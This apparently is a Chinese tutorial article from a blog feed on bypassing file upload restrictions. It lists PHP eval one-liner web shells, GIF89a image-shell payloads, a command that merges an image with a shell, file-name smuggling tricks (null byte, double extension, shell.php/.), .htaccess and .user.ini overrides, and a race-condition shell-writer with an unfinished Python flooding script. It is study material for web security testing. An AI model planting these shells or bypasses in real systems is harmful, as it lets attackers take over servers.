---
title: 文件上传
url: https://mp.weixin.qq.com/s/f1na8iTqkWVGpqUwKWpsTQ
source: Doonsec's feed
date: 2026-01-17
fetch_date: 2026-01-18T03:36:09.288350
---

# 文件上传

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/zDpX4yCYbJaOVMicf7XE1jIRpYQkt0jR3jqibGB5WNWdJT1aeDDOwlZibC6QRuI9tPNczBlxy3iam7UZXlTafnsA5g/0?wx_fmt=jpeg)

# 文件上传

原创

zoe
zoe

哦0吼

![]()

在小说阅读器中沉浸阅读

# 前置知识

### 1、常见文件头

![](https://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJaOVMicf7XE1jIRpYQkt0jR3xHsRNDfbdamoarFKnSv2rTwwTicrlbGa6lpaSxUhHpj3oKeOCgGPbuA/640?wx_fmt=png&from=appmsg)

###

文件头：

JPEG(jpg):FF D8 FF

PNG(png):89 50 4E 47

GIF(gif):47 49 46 38

HTML(html):68 74 6D 6C

ZIP(zip):50 4B 03 04

RAR:52 61 72 21

pdf:25 50 44 46 2D 31 2E

MS Word/Excel :D0 CF 11 F0

### 2、中间件和配置文件

**Apache**:web服务器中间件，php解析，支持静态资源处理

**解析规则：从右向左解析文件后缀。**若最右侧扩展名不可识别，向左遍历直至找到可解析后缀（如 1.php.xxx，xxx 不可识别则解析 php）

**.htaccess** ：（目录级配置，需开启 AllowOverride All）

1. **AddType application/x-httpd-php .png .jpg .gif**：将指定后缀文件（如.png）当作 PHP 解析执行
2. **SetHandler application/x-httpd-php**：当前目录**所有文件**均以 PHP 解析执行（无论后缀）

**.user.ini:**.user.ini文件中的auto\_append\_file和auto\_prepend\_file两个配置项指定的文件都会被当前目录的可执行的PHP文件。所包含上传的.user.ini文件目录必须存在可执行的php文件。

1. **auto\_prepend\_file=1.jpg**：每个 PHP 文件执行前，先自动包含 1.jpg 文件（将 1.jpg 中的恶意代码当作 PHP 执行）
2. **auto\_append\_file=1.jpg**：每个 PHP 文件执行后，自动包含 1.jpg 文件（效果同上，触发时机不同）

### 3、一句话木马

<?php

@eval($\_REQUEST[8]);

?>

（使用：eg: /upload.php?8=phpinfo()  ）

<?php

@eval($\_POST['w']);

?>

<script language="php"> @eval($\_REQUEST['w']); </script>

# 文件上传

1. 定义：网站对用户上传的文件缺乏严格的校验（后缀、类型、内容等），导致攻击者可上传恶意脚本文件（如 PHP 一句话木马），并通过访问该文件执行恶意代码，获取服务器权限。
2. 核心危害：上传 WebShell、窃取服务器数据、植入恶意程序、控制整个服务器集群。
3. 关键前提：上传的恶意文件能被服务器解析执行（如 PHP 脚本需被 Apache/Nginx 解析为 PHP 代码），且上传目录具备可访问、可执行权限。

# 常见方式，思路

### 1、前端JavaScript检测绕过

常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹框告知。此时，上传文件的数据包并没有被发送到服务器端，**只是在客户端浏览器中使用JavaScript对数据包进行检测**。

**检测：**查看源码，找到相关JS

**方法：**(1)使用浏览器的插件，**删除检测文件后缀的JavaScript代码**，然后上传文件即可绕过。

(2)**先把需要上传的文件的后缀改成允许上传的**，即可绕过JavaScript的检测。然后**抓包，把后缀名改成可执行文件的后缀即**可上传成功。

### 2、后端MIME类型检测绕过

服务器端的代码通过Content-Type的值来判断文件的类型。因为**Content-Type**的值是通过客户端传递的，是可以任意修改的。

常见合法 Content-Type（用于绕过）：

1. 图片类型：image/jpeg、image/png、image/gif
2. 静态文件：text/plain、text/html

eg:当上传一个.php文件时，在Burp Suite中将Content-Type修改为image/jpeg，就可以绕过服务器端的检测。

### 3、后端文件内容检测绕过

**检测：**校验文件内容是否符合预期（如图片文件是否包含合法图片头、是否有恶意代码），常见方式为「文件头检测」。

**方法：**文件头欺骗、图片马

**常见文件头：GIF89a、PNG**

eg:

GIF89a

<?php @eval($\_REQUEST[8]); ?>

图片马：将正常图片与恶意脚本合并为一个文件，既包含合法图片头和内容，又包含恶意代码，绕过文件内容检测。

操作步骤（Windows 命令行）：

1. 准备正常图片文件 123.jpg 和恶意脚本文件 shell.php（放在同一目录下）。
2. 打开 CMD 命令行，执行合并命令：**copy 123.jpg/b + shell.php 2.jpg**

(/b 表示以二进制模式合并，保证图片文件结构不被破坏。)

### 4、后端文件后缀检测绕过

**黑名单检测：**虽然限制了部分后缀的文件，但有些可以解析其他文件后缀。

**方法：**

**1、PHP 常见可解析后缀（绕过黑名单必备）：php、php3、php4、php5、phtml、pht、phtm**

**2、利用Apache从右到左解析**： eg**:shell.php.abc**

**3、双写绕过**： eg: 将恶意文件命名为 shell.pphphp、shell.phpp，服务器单次校验 / 去重后变为 shell.php。

**4、大小写绕过：**eg: .PhP

**5、00截断绕过：**%00 对应 ASCII 码的 0，表示字符串结束符，服务器解析到 %00 时会停止后续解析，截断文件名。

eg :**/upload/shell.php%00.jpg**

两种场景：

1. URL 中的 00 截断：直接在 URL 中拼接 %00（如 http://xxx.com/upload/shell.php%00.jpg，解析为 shell.php）。
2. POST 请求中的 00 截断：抓包修改文件名为 shell.php%00.jpg，并将 %00 进行 URL 解码（Burp Suite 中可右键选择「URL Decode」）。

为啥可以？

首先文件先检测 shell.php%00.jpg，（%00 未被解码为结束符，只是普通字符串），后缀是 .jpg（白名单允许的合规后缀，如图片后缀），因此检测通过。之后存储时%00生效，截断，解析时剩下了shell.php。

**6、/.绕过：**文件名末尾添加 /.，服务器处理时会自动剔除末尾的 / 和 .，还原为合法恶意后缀。

**eg:  shell.php/.**

**白名单检测：**维护一份允许上传的后缀名单（如 jpg、png、gif），仅名单内后缀文件可上传。

可通过「文件解析漏洞」「配置文件篡改」绕过（如将 .png 文件解析为 PHP）。

**方法：利用配置文件绕过**

**1、上传 .htaccess 文件**

1. 创建上传 .htaccess 文件：
2. 上传包含恶意代码的 .png 文件

eg: AddType application/x-httpd-php .png

SetHandler application/x-httpd-php

**2、上传.user.ini文件**

1. 创建上传 .user.ini 文件
2. 传包含恶意代码的 1.jpg文件

### **5、二次渲染检测绕过**

上传文件后，服务器会对文件进行二次处理（如图片压缩、格式优化、尺寸调整），生成新文件替换原上传文件，处理过程中会删除非文件本身的冗余内容（包括恶意代码）。

**检测**：一般上传过去的图片与原图大小不一样

**方法：**二次处理存在固定保留区域，可将恶意代码插入该区域实现绕过。

### 6、条件竞争检测绕过

核心原理：网站上传逻辑存在漏洞 —— 先允许上传任意文件到服务器，再校验文件是否为恶意文件，若为恶意文件则删除。利用「上传成功」到「文件删除」的时间差，快速访问上传的恶意文件，触发代码执行并生成新的永久 WebShell。

eg:

**<?phpfputs(fopen('../shell.php','w'),'<?php @eval($ PoST[a])?>');?>**

**<?php**

**$myfile=fopen("my.php","w");**

**$txt="<?php phpinfo();?>";**

**fwrite($myfile,$txt);**

**fclose($myfile);**

**?>**

使用 Burp Suite 或 Python 脚本，持续上传并同时持续访问该文件（利用时间差）

当访问成功时，服务器会生成 shell.php（永久存在，不会被删除），后续直接访问 shell.php 即可获取 WebShell。

**辅助工具：Python 批量上传 & 访问脚本（简化操作）:**

import requests

import threading

# 目标网址（上传接口和访问接口）

upload\_url = "http://xxx.com/upload.php"

access\_url = "http://xxx.com/upload/4.php"

# 上传文件函数

def upload\_file():

files = {"file": ("4.php", open("4.php", "rb"), "image/png")}

while True:

try:

requests.post(upload\_url, files=files)

print("上传一次 4.php")

except:

pass

# 访问文件函数（触发生成 shell.php）

def access\_file():

while True:

try:

requests.get(access\_url)

print("访问一次 4.php")

except:

pass

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJYLKMBcUukj7iaad82ubg60VaW1mmPNFOTwtequELJmI0R6ecqHfp3hsomicqicaOXpOtJxSPOJanclQ/0?wx_fmt=png)

哦0吼

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/zDpX4yCYbJYLKMBcUukj7iaad82ubg60VaW1mmPNFOTwtequELJmI0R6ecqHfp3hsomicqicaOXpOtJxSPOJanclQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过